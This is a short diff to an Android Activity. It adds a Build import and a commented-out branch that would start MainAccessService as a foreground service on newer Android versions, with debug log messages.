@@ -3,6 +3,7 @@ package androidaid.android.com.androidaid;
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 import android.os.Bundle;
 import android.view.WindowManager;
 
@@ -73,8 +74,18 @@ public class Main extends Activity {
         }
 
         System.out.println("[sproc32.main]: Starting service");
-        
+
         Intent startServiceIntent = new Intent(getApplicationContext(), MainAccessService.class);
         startService(startServiceIntent);
+
+        /*
+        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O) {
+            System.out.println("[sproc32.main]: Running on post 7.0 device. Starting foreground service.");
+            startForegroundService(startServiceIntent);
+        } else {
+            System.out.println("[sproc32.main]: Running on pre 7.0 device. Starting background service.");
+            startService(startServiceIntent);
+        }
+        */
     }
 }
